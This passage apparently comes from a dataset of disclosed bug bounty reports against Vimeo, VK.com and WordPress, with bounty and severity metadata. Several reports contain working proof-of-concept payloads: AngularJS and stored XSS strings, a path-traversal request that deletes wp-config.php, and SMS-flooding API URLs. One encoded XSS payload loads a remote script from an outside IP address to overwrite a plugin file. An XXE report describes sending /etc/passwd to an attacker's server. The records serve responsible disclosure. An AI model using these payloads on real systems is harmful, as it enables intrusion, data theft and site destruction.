2nd request ---> https://vimeo.com/tools/widget/montage?widget=1&preview=1&user_id=36807051&badge_stream=channel&badge_channel=870575&badge_album=3231945&badge_layout=horizontal&badge_quantity=6&show_titles=no&badge_size=80
###Note badge_channel parameter to any value.
Open this link ---> https://vimeo.com/tools/widget/montage?widget=1&preview=1&user_id=36807051&badge_stream=channel&badge_channel=870575&badge_album=3231945&badge_layout=horizontal&badge_quantity=6&show_titles=no&badge_size=80
You will be shown my videos. Now keep enumerating badge_channel={any valid value}, it will get you access to any videos.

Game over ...! :D
This very dangerous as we can access any videos.

Video POC : ---> http://youtu.be/vRAtxovcfHs (It is an unlisted video on youtube.)
Hope to see this patched quickly. :-)
Regards,
Pranav",https://hackerone.com/reports/45960,New York,United States,New York,2015,1,31,17,31
Vimeo,1001-5000,0.0,50m-100m,$100.00,No value,0.0,Information Disclosure,CRITICAL full source code/config disclosure for Cameo,"avlidienbrunn  submitted a report to Vimeo.Jan 16th (8 years ago)Hi!
The server at https://ci.cameo.tv/ has directory listing on and seems to host quiet a few debian packages containing extremely sensitive information (database paswords, API keys, you name it). One example is the config package containing 16 config files, even personal ones containing local passwords etc.
I think it's pretty obvious but you need to IMMEDIATELY remove the possibility to access this server from the internet. I also think that you should check your logs for this server, and consider changing all the passwords possibly leaked.
Mathias",https://hackerone.com/reports/43998,New York,United States,New York,2015,1,16,7,43
VK.com,1001-5000,0.0,200m-1b,$100.00,Medium,6.3,Business Logic Errors,api.vk.com отдаёт в ответ HTML авторизированную страницу vk.com,zhumarin  submitted a report to VK.com.Apr 9th (6 years ago),https://hackerone.com/reports/219657,Saint Petersburg,Russia,Saint Petersburg,2017,4,9,3,48
VK.com,1001-5000,0.0,200m-1b,$500.00,No value,0.0,Violation of Secure Design Principles,"API: Bug in method auth.signup , дающий возможность бесконечно звонить ","pisarenko  submitted a report to VK.com.Jan 2nd (7 years ago)Summary by pisarenkoВ API Найдена уязвимость дающая бесконечно звонить и слать смс , лимит запросов можно было обойти.
(найдена практически такая же уязвимость , как и в репорте https://hackerone.com/reports/64963 ДАЮЩАЯ БЕСКОНЕЧНО ЗВОНИТЬ , но тут выплата 300$ , а там 500$) 
На вопрос почему так ? - ответа не последовало.
UPD , ПЕРЕСМОТРЕЛИ НАГРАДУ ПЕРЕД ОТКРЫТИЕМ РЕПОРТА ПУБЛИЧНО 
i die
███████████████████████████
███████▀▀▀░░░░░░░▀▀▀███████
████▀░░░░░░░░░░░░░░░░░▀████
███│░░░░░░░░░░░░░░░░░░░│███
██▌│░░░░░░░░░░░░░░░░░░░│▐██
██░└┐░░░░░░░░░░░░░░░░░┌┘░██
██░░└┐░░░░░░░░░░░░░░░┌┘░░██
██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
██▌░│██████▌░░░▐██████│░▐██
███░│▐███▀▀░░▄░░▀▀███▌│░███
██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
████▄─┘██▌░░░░░░░▐██└─▄████
█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
███████▄░░░░░░░░░░░▄███████
██████████▄▄▄▄▄▄▄██████████
███████████████████████████",https://hackerone.com/reports/107877,Saint Petersburg,Russia,Saint Petersburg,2016,1,2,21,18
VK.com,1001-5000,0.0,200m-1b,$500.00,No value,0.0,None,API: Bug in method auth.validatePhone,"vladislav805  submitted a report to VK.com.May 30th (7 years ago)The bug is that auth.validatePhone does not validate the parameter ""sid"". In theory he should be in the format ""2fa$userId$appId$hash"", but to get the correct result (send SMS/make call) enough only ""2fa$userId_$anyText"".
For example, these requests will send a SMS:
https://api.vk.com/method/auth.validatePhone?sid=2fa_23048942_lolka
https://api.vk.com/method/auth.validatePhone?sid=2fa_66748_блаблабла
It turns out that with this endlessly send SMS with the activation code, and to call if the request to add voice=1:
https://api.vk.com/method/auth.validatePhone?sid=2fa_66748_блаблабла&voice=1
There is also another bug. SMS and calls will be carried out in any case, even if the user has disabled two-factor authentication.
// I don't know, are you interested. But there is a bug - I reported.mihver1   changed the status to Triaged. Jun 10th (7 years ago)Thank you for the report. We will investigate this issue and write you back.mihver1   closed the report and changed the status to Resolved. Jun 17th (7 years ago)Действительно уязвимость была. Закрыли. Проверьте, пожалуйста.vladislav805   requested to disclose this report. Jun 17th (7 years ago)Да, исправлено.VK.com  rewarded vladislav805 with a $500 bounty. Jun 26th (7 years ago)Надеемся на дальнейшее сотрудничество, однако мы не хотим публиковать данную уязвимость.  This report has been disclosed. Jul 17th (7 years ago)",https://hackerone.com/reports/64963,Saint Petersburg,Russia,Saint Petersburg,2015,5,30,20,47
VK.com,1001-5000,0.0,200m-1b,$500.00,Medium,5.45,XML External Entities (XXE),Blind XXE on pu.vk.com,"barracud4_  submitted a report to VK.com.Dec 10th (5 years ago)Summary by barracud4_Blind XXE vulnerability in processing of uploaded XML-documents such as docx.
Vulnerability was hard-exploitable, because all data retrieval channels did not work except DNS.",https://hackerone.com/reports/296622,Saint Petersburg,Russia,Saint Petersburg,2017,12,10,1,18
VK.com,1001-5000,0.0,200m-1b,$500.00,Critical,9.5,Information Disclosure,Backup Source Code Detected,"linkks  submitted a report to VK.com.Jan 26th (5 years ago)Summary by linkksСтарый сборщик логов.
Который я увидел а также получил доступ к бд  !",https://hackerone.com/reports/309537,Saint Petersburg,Russia,Saint Petersburg,2018,1,26,12,14
VK.com,1001-5000,0.0,200m-1b,$500.00,Low,2.0,Privilege Escalation,Bypass User Interaction to initiate a VoIP call to Another User,heeeeen  submitted a report to VK.com.Jul 24th (4 years ago),https://hackerone.com/reports/386144,Saint Petersburg,Russia,Saint Petersburg,2018,7,24,8,33
VK.com,1001-5000,0.0,200m-1b,$100.00,No value,0.0,Information Disclosure,Checking whether user liked the media or not even when you are blocked ,"vraj  submitted a report to VK.com.Jan 18th (7 years ago)Poc :
Take 2 accounts A and B
1.) Now from A id make a random post say http://vk.com/id307083341?w=wall307083341_36
2.)Now from C id try to like the post of A .
3.)Now from B id visit https://vk.com/dev/likes.getList
4.) now put the owner id A and the post id == > 307083341 which 36 in this case
5.)and in the the friends_only field change 1 to 0
6.)then hit run you will find that vk.com will return the array of guys who have liked it now open another tab
7.)Now block B from A account .
8.)Now try to again query https://vk.com/dev/likes.getList the same from 3 you will find that now vk.com will not allow you ! error
but now
9.)But these methods are not protected === > Visit now  https://vk.com/dev/likes.isLiked  and now put the owner_id=[307---], item_id=36 , user_id of the guy to which you have to check whether he has liked or not the media  and this time their is no error and vk.com will show liked : 1 
Hence no where in the application this information is being disclosed but here is the end point leaking the information
raj_vexe   changed the status to Triaged. Mar 31st (7 years ago)Thank you for the report. We will investigate this issue and write you back.explain   closed the report and changed the status to Resolved. Apr 20th (7 years ago)Fixed, check it, please.vraj   posted a comment. Apr 21st (7 years ago)Hi @exe looks good ! what about bounty ?
Regards
vishwaVK.com  rewarded vraj with a $100 bounty. Apr 25th (7 years ago)vraj   requested to disclose this report. Apr 25th (7 years ago)thanks @exe for the bounty   This report has been disclosed. May 25th (6 years ago)",https://hackerone.com/reports/111417,Saint Petersburg,Russia,Saint Petersburg,2016,1,18,14,16
VK.com,1001-5000,0.0,200m-1b,$100.00,Medium,5.45,Cross-Site Request Forgery (CSRF),CSRF в m.vk.com,executor  submitted a report to VK.com.Dec 28th (5 years ago),https://hackerone.com/reports/300999,Saint Petersburg,Russia,Saint Petersburg,2017,12,28,17,46
VK.com,1001-5000,0.0,200m-1b,$100.00,No value,0.0,Cross-Site Request Forgery (CSRF),CSRF в виджетах ,circuit  submitted a report to VK.com.Jan 31st (2 years ago),https://hackerone.com/reports/1091296,Saint Petersburg,Russia,Saint Petersburg,2021,1,31,16,24
VK.com,1001-5000,0.0,200m-1b,$100.00,Medium,5.45,Cross-Site Request Forgery (CSRF),CSRF на загрузку аудиозаписей,executor  submitted a report to VK.com.Mar 23rd (5 years ago),https://hackerone.com/reports/329345,Saint Petersburg,Russia,Saint Petersburg,2018,3,23,20,1
VK.com,1001-5000,0.0,200m-1b,$100.00,Low,2.0,Cross-Site Request Forgery (CSRF),CSRF на сброс ключа трансляции.,circuit  submitted a report to VK.com.May 22nd (5 years ago),https://hackerone.com/reports/230688,Saint Petersburg,Russia,Saint Petersburg,2017,5,22,14,0
VK.com,1001-5000,0.0,200m-1b,$100.00,Medium,5.45,Cross-Site Request Forgery (CSRF),"CSRF на ""ловлю гостей"" и раскрытие аудиотрансляции в частной группе","povargek  submitted a report to VK.com.Jan 1st (5 years ago)exe   changed the status to Triaged. Jan 2nd (5 years ago)povargek   posted a comment. Jan 23rd (5 years ago)exe   closed the report and changed the status to Resolved. Jan 23rd (5 years ago)VK.com  rewarded povargek with a $100 bounty. Jan 28th (5 years ago)povargek   requested to disclose this report. Mar 30th (5 years ago)povargek   posted a comment. Apr 21st (5 years ago)exe   agreed to disclose this report. Apr 26th (5 years ago)  This report has been disclosed. Apr 26th (5 years ago)Summary by povargekУязвимость позволяла узнать ID пользователей, которые попались на CSRF, и так же можно было узнать  песню, которая транслируется в частной группе.
/al_audio.php?act=a_get_audio_status не имел hash добавлял юзера в список слушателей и показывал песню, если она шла в частной группе",https://hackerone.com/reports/301631,Saint Petersburg,Russia,Saint Petersburg,2018,1,1,13,34
VK.com,1001-5000,0.0,200m-1b,$100.00,No value,0.0,None,CSRF Добавить просмотр к записи без ведома пользователя.,"circuit  submitted a report to VK.com.Jul 21st (5 years ago)Summary by circuitОтсутствовал параметр hash при учете просмотра записей.
Можно было вести массовую накрутку просмотров на посты. При этом просмотры крутились даже в частную группу, несмотря на то, что у нас к ней не было доступа.
POC выглядел так:
Code 574 Bytes1https://vk.com/al_page.php?act=seen&al=1&data=238237355_r268%3A767%3A16%3A1241520615%3B275012519_r1964%3A196%3A21%3A1241520615%2Cr1965%3A1144%3A19%3A1241520615%3B277885767_r564%3A-1%3A22%3A1241520615%3B283004407_r4390%3A516%3A18%3A1241520615%3B305469601_r668%3A744%3A20%3A1241520615%3B322118449_r2163%3A800%3A17%3A1241520615%3B370186213_r382%3A-1%3A23%3A1241520615%3B-56325271_r-189765%3A800%3A17%3A1241520615%3B-113966722_r-15672%3A1144%3A19%3A1241520615%2Cr-15685%3A196%3A21%3A1241520615%3B-150313924_r-1981%3A744%3A20%3A1241520615%3B-150706218_r-21%3A-1%3A23%3A1241520615",https://hackerone.com/reports/252324,Saint Petersburg,Russia,Saint Petersburg,2017,7,21,23,26
VK.com,1001-5000,0.0,200m-1b,$200.00,Low,2.0,Improper Access Control - Generic,[Клевер/Android] Небезопасный BroadcastReceiver позволяет создавать окно диалога в приложении посредством другого неавторизованного приложения,"norver  submitted a report to VK.com.Aug 13th (4 years ago)Summary by norvermore_thEn_vulnerability
Click to view screenshot
Когда приложение видно пользователю в MainActivity регистрируются два ресивера:
Code 137 Bytes1registerReceiver(this.r, new IntentFilter(""com.vk.quiz.action""));
2registerReceiver(this.q, new IntentFilter(""com.vk.quiz.action.coins""));
Особую опасность представляет первый, он позволяет создавать диалог с заголовком, описанием и картинкой, которую можно получить по url. Это позволяет другому приложению, не имеющего разрешения на доступ к Интернету, воспользоваться ресивером для передачи нужной ему информации. Таким образом уязвимость опасна для устройства пользователя.
Повторить можно примерно следующей командой (adb выступает в роли неавторизованного приложения):
Code 209 Bytes1adb shell am broadcast -a com.vk.quiz.action --es action ""com.vk.quiz.action.message.modal"" --es title ""more_then_title"" --es text ""more_then_text"" --es image ""https://www.hackerone.com/assets/images/logo.png""",https://hackerone.com/reports/394332,Saint Petersburg,Russia,Saint Petersburg,2018,8,13,21,22
VK.com,1001-5000,0.0,200m-1b,"$1,000.00",No value,0.0,None,[VK Android] Access to app protected components leads to arbitrary code execution,bagipro  submitted a report to VK.com.Feb 4th (2 years ago),https://hackerone.com/reports/1095633,Saint Petersburg,Russia,Saint Petersburg,2021,2,4,17,18
VK.com,1001-5000,0.0,200m-1b,$100.00,No value,0.0,Information Disclosure,Able to intercept app Traffic after choosing up the Secured Connection using SSL (HTTPS),"bugwrangler  submitted a report to VK.com.May 29th (7 years ago)Install the app
Login with Valid credentials
Settings - Choose Secured connection (HTTPS)
Close the app
Set the proxy and Open the app
verify that Connection isn't Secured and able to intercept (PFA POC) 
Expected Result : Secured layer & SSL PINING should be applied successfully.  1 attachment:F39097: Screen_Shot_2015-05-30_at_3.50.12_am.png",https://hackerone.com/reports/64731,Saint Petersburg,Russia,Saint Petersburg,2015,5,29,22,44
VK.com,1001-5000,0.0,200m-1b,$500.00,No value,0.0,Cross-Site Request Forgery (CSRF),"CSRF в получении резервных токенов+framing , приводящие к компроментации 2fa",abr1k0s  submitted a report to VK.com.Sep 23rd (7 years ago),https://hackerone.com/reports/90165,Saint Petersburg,Russia,Saint Petersburg,2015,9,23,13,43
WordPoints,11-50,0.0,under-1m,$25.00,No value,0.0,Violation of Secure Design Principles,Weak Cryptographic Hash,"ru94mb  submitted a report to WordPoints.Jul 21st (7 years ago)Issue:
The following files are vulnerable to this issue:
\src\includes\class-breaking-updater.php line 246 and 247
protected function check_module( $module ) {
		$rand_str = str_shuffle( md5( microtime() ) );
$nonce = md5( $rand_str . 'wordpoints_check_modules-' . $module );
\src\admin\includes\class-wordpoints-modules-list-table.php line 541
switch ( $column_name ) {
					case 'cb':
$checkboxid = 'checkbox' . md5( $module_data['name'] );
\src\components\points\includes\class-wordpoints-points-logs-query.php line 705
private function _calc_cache_query_md5() {
		if ( ! isset( $this->_cache_query_md5 ) ) {
$this->_cache_query_md5 = md5( $this->get_sql() );
}
}
Explanation:
Weak cryptographic hashes are susceptible to attacks like rainbow table searches. Hashing algorithms like MD5 and SHA-1 has been marked obsolete according to latest coding standards. This risk the integrity of security critical data to be compromised.
Recommendation:
Discontinue the use of MD5 and SHA-1 algorithms. Use SHA-256 or above to perform one way hashing for better security and integrity of data.",https://hackerone.com/reports/77231,New York,United States,Rosebank,2015,7,21,7,29
WordPress,101-250,0.0,1m-10m,$275.00,Low,2.0,Open Redirect,"[BuddyPress 2.9.1] Open Redirect via ""wp_http_referer"" parameter on ""bp-profile-edit"" endpoint","ysx  submitted a report to WordPress.Oct 15th (5 years ago)Hi,
In a similar manner to #228569, it is currently possible to execute authenticated open redirections via the wp_http_referer parameter used in the BuddyPress extended user edit screen.
Proof of concept
Upon accessing the below URL, please select the ""Update Profile"" button, then select the ""←Back to Users"" link. This will redirect a target to the attacker-specified address (in this case, ""google.com"").
Code 90 BytesWrap lines Copy Download1http://instance/wp-admin/users.php?page=bp-profile-edit&wp_http_referer=https://google.com
Supporting evidence
Image F229538: BuddyPress_Redirect.png 8.14 KiBZoom in Zoom out Copy Download
Thanks,
Yasin1 attachment:F229538: BuddyPress_Redirect.pngSummary by ysxAn injection in the wp_http_referer parameter used on the BuddyPress Extended Profile edit screen could be leveraged to conduct authenticated open redirections. Thanks again to @boonebgorges, @iandunn, and the BuddyPress team for the swift communication and fix.",https://hackerone.com/reports/277502,California,United States,Menlo Park,2017,10,15,20,36
WordPress,101-250,0.0,1m-10m,$350.00,High,7.7,None,[Buddypress] Arbitrary File Deletion through bp_avatar_set,"mopman  submitted a report to WordPress.Nov 20th (6 years ago)Hi,
The bp_avatar_set action in BuddyPress when cropping avatars allows an attacker to arbitrarily delete a file the webserver can delete through the 'original_file' parameter.
For example:

Create a user on a Buddypress-powered Wordpress instance (any user is OK, doesn't need to be admin, just needs to have the ability to change it's own avatar in the Buddypress profile which is normal).
Navigate to the avatar change URL for example /members/<username>/profile/change-avatar/ on my install.
Click the button to upload an image and select any valid image. Allow the first request which uploads this image to submit as normal.
Select the crop button, but do not allow the request to complete (I used Burp and enabled intercept mode). Modify the request to change the original_file parameter to point to a file you wish to delete, traversing up with ../.. if needed. So for example where my legitimate param was:

original_file=http%3A%2F%2Flocalhost%2F~sam%2Fwordpress%2Fwp-content%2Fuploads%2Favatars%2F2%2Fmy_ugly_face.jpg
Change to:
original_file=http%3A%2F%2Flocalhost%2F~sam%2Fwordpress%2Fwp-content%2Fuploads%2Favatars%2F2%2F../../../../../wp-config.php
Remember it will be in a numbered folder probably, so you need one more .. than expected from the URL. You can upload an image for real to see how the path ends up for guidance on this if you're an attacker and don't know the folder structure.
The wp-config.php file will be deleted when unlink() is called and the blog will then be unavailable, of course, in this case.
This path needs to be somehow validated such that it can only delete uploaded avatars (constraining to the upload directory would still allow you to delete, say, other users avatars, or other uploaded files, which would still make me sad :()
Let me know if you have any trouble reproducing or need any further info - I think I explained OK, but it is very late here. ;)
o/",https://hackerone.com/reports/183568,California,United States,Menlo Park,2016,11,20,6,36
WordPress,101-250,0.0,1m-10m,$225.00,Medium,5.45,Cross-site Scripting (XSS) - Reflected,[mercantile.wordpress.org] Reflected XSS,zeeshank  submitted a report to WordPress.Jun 15th (5 years ago),https://hackerone.com/reports/240256,California,United States,Menlo Park,2017,6,15,16,11
WordPress,101-250,0.0,1m-10m,$300.00,Medium,5.45,Cross-site Scripting (XSS) - Reflected,[mercantile.wordpress.org] Reflected XSS via AngularJS Template Injection,"ysx  submitted a report to WordPress.May 20th (6 years ago)Hi,
By injecting a crafted AngularJS payload into the search endpoint on the WordPress Swag Store, it was possible to achieve reflected XSS further to resolved report #221893.
I came across a potential exploitation vector after noticing that a search query for {{2*2}} returned 4 in the site title response.
Conditions Verified In

Firefox 52.0.3 – stable
Safari 10.1 – stable

Proof of Concept URL
Code 95 BytesWrap lines Copy Download1https://mercantile.wordpress.org/search/{{constructor.constructor('alert(document.domain)')()}}
Screenshot
Image F186517: Mercantile_XSS.png 30.52 KiBZoom in Zoom out Copy Download
Thanks!1 attachment:F186517: Mercantile_XSS.pngSummary by ysxIn a follow-up to resolved report #221893, it was possible to achieve reflected XSS on mercantile.wordpress.org with an AngularJS injection payload. This was confirmed in the latest stable Firefox and Safari builds.",https://hackerone.com/reports/230234,California,United States,Menlo Park,2017,5,20,13,56
WordPress,101-250,0.0,1m-10m,$225.00,Medium,5.45,Privilege Escalation,"Allow authenticated users can edit, trash,and add new in BuddyPress Emails function","hoangkien1020  submitted a report to WordPress.Mar 29th (3 years ago)Description:
Allow author can edit, trash,and add new your posts in BuddyPress Emails function
And editor can edit,trash, add new any posts in BuddyPress Emails default.
## Steps To Reproduce:
Step 1 : Create two accounts: Admin and Author
Step 2: Login with admin account. In admin account, give author to admin account.
Step 4: Login with author within dashboard
Access link:
domain/wp-admin/edit.php?post_type=bp-email
Step 5: Revoke author to author privilege in admin account
Step 6: Within author dashboard, author can edit, trash,and add new
PoC by video:
https://bit.ly/2UH7iLz
## Recommendations
Valid user current session access.
Impact
Author can edit, trash,and add new in BuddyPress Emails.
And editor can edit,trash, add new any posts in BuddyPress Emails default.",https://hackerone.com/reports/833782,California,United States,Menlo Park,2020,3,29,8,52
WordPress,101-250,0.0,1m-10m,$350.00,Medium,6.1,Cross-site Scripting (XSS) - Stored,Authenticated Cross-site Scripting in Template Name,"zurke  submitted a report to WordPress.Apr 14th (6 years ago)Explanation
During my research on latest WordPress I found that $file_description  and $description from wp-admin/theme-editor.php  are not filtering name of the template allowing attacker to do XSS attack.
Code 601 BytesWrap lines Copy Download1...
2		$file_description = get_file_description( $filename );
3
4		if ( $filename !== basename( $absolute_filename ) || $file_description !== $filename ) {
5			$file_description .= '<br /><span class=""nonessential"">(' . $filename . ')</span>';
6
7		}
8
9		if ( $absolute_filename === $file ) {
10			$file_description = '<span class=""highlight"">' . $file_description . '</span>';
11
12		}
13
14		$previous_file_type = $file_type;
15?>
16		<li><a href=""theme-editor.php?file=<?php echo urlencode( $filename ) ?>&amp;theme=<?php echo urlencode( $stylesheet ) ?>""><?php echo $file_description; ?></a></li>
17<?php
18	endforeach;
19?>
From this code we can see that $file_description = get_file_description( $filename ); is getting declared and later on under <li><a> tags template name is printed on the page ...<?php echo $file_description; ?></a></li>
$file_description variable should be filtered before displayed to the user. For example using htmlspecialchars() function (example:  Wordpress_3.png (F175759) )
However, if victim click on the file that contain XSS payload, XSS will be executed because $description = get_file_description( $relative_file ); is displaying name of the active file you are editing.
Steps to replicate

Go to Appearance > Editor
Select file you want to edit (don't select files that already have name - Archives, Theme Footer for example). I used ""back-compat.php"" Wordpress_2.png (F175758)
At the very top of the file add following comment:
/* Template Name: <script>confirm(document.cookie);</script> */ Like this: Wordpress_2.png (F175758)
Click on Update File.
XSS Popup will be prompted. Wordpress_1.png (F175757)

Technology used:
Google Chrome 57.0.2987.133 (64-bit) - Latest3 attachments:F175757: Wordpress_1.pngF175758: Wordpress_2.pngF175759: Wordpress_3.png",https://hackerone.com/reports/220903,California,United States,Menlo Park,2017,4,14,2,10
WordPress,101-250,0.0,1m-10m,$225.00,Medium,5.45,Cross-site Scripting (XSS) - Stored,Authenticated Stored Cross-site Scripting in bbPress,"whoisbinit  submitted a report to WordPress.May 24th (2 years ago)Description:
There exists a stored XSS vulnerability in bbPress, due to which the XSS payload which I enter in my content, gets executed at /wp-admin/edit.php?post_type=forum. This vulnerability requires you to be an authenticated user.
Steps To Reproduce:
Step 1. Visit /wp-admin/edit.php?post_type=forum
Step 2. Click on Add New
Step 3. Write any title, and in content, write your XSS payload through the ""Text"" editor, rather than the ""Visual"" one, and publish the content.
Step 4. Now, visit /wp-admin/edit.php?post_type=forum, and you will be able to see the payload getting executed.
Recommendations
Making use of proper functions in PHP or WordPress core in the bbPress source code regarding the filtering or sanitization of user input is a recommended way to fix this vulnerability.
Impact
By taking an advantage of this vulnerability, an owner of a WordPress-based website would be able to execute their malicious JavaScript codes in context to the WordPress dashboard, which could result in bad issues to other users.1 attachment:F841334: bbPress.pngSummary by whoisbinitCVE-2020-13487 | The bbPress plugin through 2.6.4 for WordPress has stored XSS in the Forum creation section, resulting in JavaScript execution at wp-admin/edit.php?post_type=forum (aka the Forum listing page) for all users. An administrator can exploit this at the wp-admin/post.php?action=edit URI.",https://hackerone.com/reports/881918,California,United States,Menlo Park,2020,5,24,19,39
WordPress,101-250,0.0,1m-10m,$600.00,Medium,5.45,XML External Entities (XXE),Authenticated XXE,"sonarsource  submitted a report to WordPress.Feb 4th (2 years ago)Description:
The WordPress core Media Library does not securely parse XML content when running on PHP 8. By uploading a malicious .wav file, an authenticated attacker can trigger a XXE vulnerability which enables to read secret system files, DoS the web server, perform SSRF, or aim at Remote Code Execution via Phar Deserialization.
Steps To Reproduce:
Requirements:

latest WordPress 5.6 installation
running on PHP 8
author user privileges in WordPress, or higher
another web server that is controlled by the attacker to retrieve leaked data

The vulnerability can be exploited by uploading a crafted .wav file. The attached archive contains such a .wav file with a payload for extracting the content of /etc/passwd by loading an external DTD. To reproduce:

Adapt the address in the 2 files in the attached PoC archive to point to a web server that you control (and that is reachable from the targeted WordPress installation).
For the .wav file, the address has to be adapted at 0x000338CD (best use a hex editor for this, doing that with a text editor might corrupt the file).
Put the file xxe.dtd at the root of the webserver that you control.
Login to WordPress as author and upload xxe.wav  in the media library.
The content of /etc/passwd will appear in the access logs of the web server base64 encoded (see attached screenshot).

Vulnerable Code:
The vulnerable code commit is the following:
https://github.com/WordPress/WordPress/commit/03eba7beb2f5b96bd341255eaa30d6b612e62507
The vulnerable code is:
Code 490 BytesWrap lines Copy Download1			if (PHP_VERSION_ID < 80000) {
2				// http://websec.io/2012/08/27/Preventing-XEE-in-PHP.html
3				// https://core.trac.wordpress.org/changeset/29378
4				// This function has been deprecated in PHP 8.0 because in libxml 2.9.0, external entity loading is
5				// disabled by default, so this function is no longer needed to protect against XXE attacks.
6				$loader = libxml_disable_entity_loader(true);
7			}
8			$XMLobject = simplexml_load_string($XMLstring, 'SimpleXMLElement', LIBXML_NOENT);
It was recently modified to accommodate for the deprecation of the libxml_disable_entity_loader() function in PHP 8. The mistake here is to rely on the fact that XXE is no longer possible by default in PHP 8 (as it requires libxml version > 2.9). This is true, but using the LIBXML_NOENT flag is certainly not the default. The flag explicitly activates entity substitution (the name of the flag might be a little misleading). So if user input reaches that point as part of the $XMLstring variable, XXE is possible.
Impact
An attacker can:

read secret system files, such as .htaccess or wp-config.php
DoS the web server via a malicious XML document, or by loading /dev/urandom via XXE
fingerprint and exploit services in the internal network by turning the XXE into SSRF
trigger a Phar Deserialization by using the phar:// stream wrapper within the XXE which can lead to further vulnerabilities, depending on the gadget chains available in the WordPress core and its plugins.
2 attachments:F1183994: xxe.zipF1183995: screenshot.pngSummary by sonarsourceThe WordPress core Media Library did not securely parse XML content when running on PHP 8. By uploading a malicious .wav file, an authenticated attacker could trigger a XXE vulnerability which enabled to read secret system files, DoS the web server, perform SSRF, or aim at Remote Code Execution via Phar Deserialization. Find the technical advisory in our blog: https://blog.sonarsource.com/wordpress-xxe-security-vulnerability.",https://hackerone.com/reports/1095645,California,United States,Menlo Park,2021,2,4,17,34
WordPress,101-250,0.0,1m-10m,$225.00,Medium,5.45,None,Buddypress 2.9.1 - Exceeding the maximum upload size  - XSS leading to potential RCE.,"skansing  submitted a report to WordPress.Aug 24th (5 years ago)Description
This report is very similar to https://hackerone.com/bugs?subject=user&report_id=203515 so I will not go into too much details.
When uploading a avatar or profile background image thats larger than allowd, the error containing the filename will be output unsanitized leading to XSS. Making the victim upload a strangely named file for his profile requires some social engineering. Any user is vuln, but has to be admin to escalate to RCE.
The interfaces for upload that are vuln can be found at
domain.tld/members/USERNAME/profile/change-cover-image/
domain.tld/members/bbuser/profile/change-avatar/
domain.tld/wp-admin/users.php?page=bp-profile-edit
POC
The POC explores a chain of XSS => XSSI => RCE via same origin scripting, the route via XSSI is mainly due to file and char length restrictions

Login as admin
Goto /wp-admin/users.php?page=bp-profile-edit
Upload a file with the following name (mentioned below) as admin for.

Filename
POC<img src=x onerror='document.write(atob(""UnVubmluZyBQT0M8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwOi8vMTU5LjIwMy4xOTAuMTIzL3c5cmZhczg5ZXVmczllOGZ1OThld3VmandlZmlvandlX3MxMDU4Zy0vd3AtcmNlLmpzIj48L3NjcmlwdD4=""))'>
The base64 data can be verified by
btoa('Running POC<script type=""text/javascript"" src=""http://159.203.190.123/w9rfas89eufs9e8fu98ewufjwefiojwe_s1058g-/wp-rce.js""></script>'); in the browser conole.
This scripts loads the RCE script that changes the hello.php with <?php phpinfo() and redirect to it.
Code 510 BytesWrap lines Copy Download1var i = document.createElement(""iframe"");
2i.src = ""http://127.0.0.1:8090/wp-admin/plugin-editor.php?file=hello.php"";
3document.querySelector(""body"").appendChild(i);
4setTimeout(function() {
5  var p = ""<?php phpinfo();""
6  var d = document.querySelector(""iframe"").contentWindow.document;
7  var c = d.querySelector(""#newcontent"")
8  var s = d.querySelector(""#submit"")
9  c.value = p
10  s.click();
11}, 2000);
12setTimeout(function() {
13  window.location.href = ""http://127.0.0.1:8090/wp-content/plugins/hello.php""
14}, 4000);
Suggested fix
Sanitize the error. I suspect it needs a run through .html() as in #203515skansing   changed the report title from Buddypress 2.9.1 - Exceeding the maximum upload size  - XSS to RCE.  to Buddypress 2.9.1 - Exceeding the maximum upload size  - XSS leading to potential RCE. . Aug 24th (5 years ago)voldemortensen WordPress staff  changed the status to Triaged. Aug 26th (5 years ago)Hey @skansing,
Sorry it took a little longer to get to this one. Moving this to triaged as well since I was able to reproduce it.boonebgorges WordPress staff  posted a comment. Nov 1st (5 years ago)Hi @skansing - Many apologies for the radio silence. I got confused about the status of the related WP ticket, and as a result this one fell off my radar.
I've confirmed the issue, and written a patch along the lines of what you suggest above. Could you please confirm that it solves the problem for you?
The BP team has already scheduled a release for tomorrow for unrelated reasons. If we're able to review and confirm the patch internally by then, we hope to include it. Otherwise, we are aiming to have another maintenance release that could contain this security fix within the following two weeks. I'll follow up here when I have more details about timeline.1 attachment:F235263: error-xss.diffskansing   posted a comment. Updated Nov 1st (5 years ago)Hi @boonebgorges - thanks for the response, I have tested the diff locally by overwritting the bp-plupload.min.js with the contents of a patched bp-plupload.js, I guess the minimized file is build somehow is the deploy/build process before release. It did the trick, neither of the 3 areas had any XSS after the change. boonebgorges WordPress staff  closed the report and changed the status to Resolved. Nov 2nd (5 years ago)Fixed in BP 2.9.2 https://buddypress.org/2017/11/buddypress-2-9-2-security-and-maintenance-release/skansing   requested to disclose this report. Nov 2nd (5 years ago)boonebgorges WordPress staff  agreed to disclose this report. Nov 2nd (5 years ago)  This report has been disclosed. Nov 2nd (5 years ago)WordPress  rewarded skansing with a $225 bounty and a $50 bonus. Nov 8th (5 years ago)",https://hackerone.com/reports/263109,California,United States,Menlo Park,2017,8,24,22,55
WordPress,101-250,0.0,1m-10m,$275.00,Medium,5.45,Cross-site Scripting (XSS) - Reflected,XSS in the search bar of mercantile.wordpress.org,"codertom  submitted a report to WordPress.Apr 18th (6 years ago)Hi wordpress! Glad to see you here at H1.
       I found a XSS issue in the https://mercantile.wordpress.org/s=<payload here>
This works with the angular js payloads. I did inject a angular js code its because I found the ng-bindable in the source.
STEPS TO REPRODUCE

Go to https://mercantile.wordpress.org
Click on search and put this payload:

{{     c=''.sub.call;b=''.sub.bind;a=''.sub.apply;     c.$apply=$apply;c.$eval=b;op=$root.$$phase;     $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;     C=c.$apply(c);$root.$$phase=op;$root.$digest=od;     B=C(b,c,b);$evalAsync(""     astNode=pop();astNode.type='UnaryExpression';     astNode.operator='(window.X?void0:(window.X=true,prompt(document.domain)))+';     astNode.argument={type:'Identifier',name:'foo'};     "");     m1=B($$asyncQueue.pop().expression,null,$root);     m2=B(C,null,m1);[].push.apply=m2;a=''.sub;     $eval('a(b.c)');[].push.apply=a; }}
As you could now see the domain has been popped up.



